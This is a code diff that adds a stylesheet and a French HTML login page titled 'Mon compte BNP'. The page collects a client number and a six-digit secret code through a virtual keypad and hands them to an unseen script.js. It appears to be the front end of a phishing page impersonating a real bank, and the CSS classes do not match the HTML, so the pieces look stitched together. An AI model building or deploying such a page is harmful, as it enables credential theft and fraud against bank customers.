@@ -1,0 +1,176 @@
+/* Style global */
+body {
+    font-family: 'Dosis', sans-serif;
+    margin: 0;
+    padding: 0;
+    background-color: #f2f2f2;
+    color: #333;
+}
+
+.navbar {
+    background-color: #004e66;
+    padding: 10px;
+    text-align: center;
+}
+
+.navbar img {
+    height: 50px;
+}
+
+.slog {
+    text-align: center;
+    margin-top: 20px;
+}
+
+.slog h1 {
+    font-size: 24px;
+    font-weight: bold;
+    color: #004e66;
+}
+
+.log {
+    width: 90%;
+    max-width: 400px;
+    margin: 20px auto;
+    padding: 20px;
+    background: #fff;
+    border-radius: 10px;
+    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+}
+
+.log label {
+    display: block;
+    margin-bottom: 15px;
+    font-weight: bold;
+    font-size: 14px;
+    color: #333;
+}
+
+input.number,
+input.pass {
+    width: 100%;
+    padding: 10px;
+    margin-top: 5px;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    font-size: 16px;
+    box-sizing: border-box;
+}
+
+.tab {
+    margin-top: 20px;
+}
+
+.car {
+    width: 100%;
+    border-collapse: collapse;
+}
+
+.car td {
+    text-align: center;
+    padding: 5px;
+}
+
+button.y {
+    width: 50px;
+    height: 50px;
+    font-size: 18px;
+    background-color: #004e66;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+}
+
+button.y:hover {
+    background-color: #006a8e;
+}
+
+button.b {
+    display: block;
+    width: 100%;
+    padding: 10px;
+    margin-top: 20px;
+    font-size: 16px;
+    color: #fff;
+    background-color: #004e66;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+}
+
+button.b:hover {
+    background-color: #006a8e;
+}
+
+/* Informations complémentaires */
+.info, .suite {
+    width: 90%;
+    max-width: 600px;
+    margin: 20px auto;
+    padding: 20px;
+    background: #fff;
+    border-radius: 10px;
+    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+}
+
+.info p, .suite p {
+    font-size: 14px;
+    line-height: 1.5;
+    margin-bottom: 10px;
+    color: #555;
+}
+
+.info a, .suite a {
+    text-decoration: none;
+    color: #004e66;
+    font-weight: bold;
+}
+
+.info a:hover, .suite a:hover {
+    color: #006a8e;
+}
+
+hr {
+    border: none;
+    border-top: 1px solid #ccc;
+    margin: 20px 0;
+}
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion - Mon compte BNP</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <h1>ACCÉDER À MON COMPTE</h1>
+        <form id="loginForm">
+            <label for="clientNumber">1. Mon numéro client</label>
+            <input type="tel" id="clientNumber" maxlength="10" required>
+
+            <label for="secretCode">2. Mon code secret (6 chiffres)</label>
+            <input type="password" id="secretCode" maxlength="6" readonly required>
+
+            <div class="keyboard">
+                <button type="button" class="key">0</button>
+                <button type="button" class="key">1</button>
+                <button type="button" class="key">2</button>
+                <button type="button" class="key">3</button>
+                <button type="button" class="key">4</button>
+                <button type="button" class="key">5</button>
+                <button type="button" class="key">6</button>
+                <button type="button" class="key">7</button>
+                <button type="button" class="key">8</button>
+                <button type="button" class="key">9</button>
+                <button type="button" class="key" id="delete">Supprimer</button>
+            </div>
+
+            <button type="submit">Accéder à mes Comptes</button>
+        </form>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
